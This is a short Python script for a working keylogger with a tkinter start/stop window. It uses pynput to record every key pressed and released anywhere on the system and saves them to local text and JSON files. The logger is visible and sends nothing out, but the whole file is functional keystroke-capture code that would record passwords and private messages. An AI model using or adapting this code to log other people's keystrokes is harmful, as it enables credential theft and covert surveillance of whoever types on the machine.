import tkinter as tk
from tkinter import ttk
from pynput import keyboard
import json

# Initialize variables
keys_used = []
keys = ""

def generate_text_log(key):
    with open('key_log.txt', "w+") as keys_file:
        keys_file.write(key)

def generate_json_file(keys_used):
    with open('key_log.json', 'w') as key_log:
        json.dump(keys_used, key_log)

def on_press(key):
    global keys_used, keys
    key_data = {'Pressed': f'{key}'}
    keys_used.append(key_data)
    generate_json_file(keys_used)

    keys += str(key)
    generate_text_log(keys)

def on_release(key):
    global keys_used
    key_data = {'Released': f'{key}'}
    keys_used.append(key_data)
    generate_json_file(keys_used)

def start_keylogger():
    global listener
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    label.config(text="[+] Keylogger is running!\n[!] Saving the keys in 'key_log.txt'")
    start_button.config(state='disabled')
    stop_button.config(state='normal')

def stop_keylogger():
    global listener
    listener.stop()
    label.config(text="Keylogger stopped.")
    start_button.config(state='normal')
    stop_button.config(state='disabled')

# Create the main application window
root = tk.Tk()
root.title("Keylogger")

# Set the GUI style
style = ttk.Style(root)
style.theme_use("clam")

# Configure the layout
label = ttk.Label(root, text='Click "Start" to begin keylogging.')
label.pack(pady=10)

start_button = ttk.Button(root, text="Start", command=start_keylogger)
start_button.pack(side='left', padx=(20, 10), pady=20)

stop_button = ttk.Button(root, text="Stop", command=stop_keylogger, state='disabled')
stop_button.pack(side='right', padx=(10, 20), pady=20)

root.geometry("300x150")
root.resizable(False, False)

root.mainloop()
